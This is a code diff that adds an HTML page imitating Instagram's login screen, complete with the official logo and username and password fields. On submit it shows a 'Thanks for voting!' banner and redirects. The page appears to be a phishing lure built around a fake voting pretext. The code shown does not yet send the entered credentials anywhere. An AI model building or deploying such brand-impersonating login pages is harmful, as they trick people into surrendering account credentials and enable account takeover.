@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+            flex-direction: column;
+            position: relative;
+        }
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            cursor: pointer;
+        }
+        .back-btn img {
+            width: 24px;
+            height: 24px;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 80px;
+        }
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #000;
+            cursor: pointer;
+        }
+    .thanks-message {
+      display: none;
+      margin-top: 20px;
+      font-size: 18px;
+      color: green;
+      font-weight: bold;
+    }
+    </style>
+</head>
+<body>
+
+    <!-- Back button -->
+    <div class="back-btn" onclick="goBack()">
+        <img src="https://cdn-icons-png.flaticon.com/512/271/271220.png" alt="Back">
+    </div>
+
+    <!-- Instagram official logo -->
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+    </div>
+
+    <div class="login-container">
+        <input type="text" class="input-field" id="email" placeholder="Username, email or mobile number">
+        <input type="password" class="input-field" id="password" placeholder="Password">
+        <button class="login-btn" onclick="login()">Log in</button>
+        <div class="forgot-password" onclick="forgotPassword()">Forgot password?</div>
+    </div>
+
+    <div class="thanks-message" id="thanksMessage">Thanks for voting!</div>
+
+    <script>
+        function goBack() {
+            window.history.back(); // Navigate back to the previous page
+        }
+
+        function forgotPassword() {
+            alert("Forgot password clicked! Implement password reset logic.");
+        }
+
+        function login() {
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value;
+
+            if (email === "") {
+                alert("Please enter your email or phone number.");
+                return;
+            }
+
+            if (password.length < 8) {
+                alert("Password must be at least 8 characters long.");
+                return;
+            }
+
+            // Show thanks banner
+            const thanks = document.getElementById("thanksMessage");
+            thanks.style.display = "block";
+
+            // Redirect after 3 seconds
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
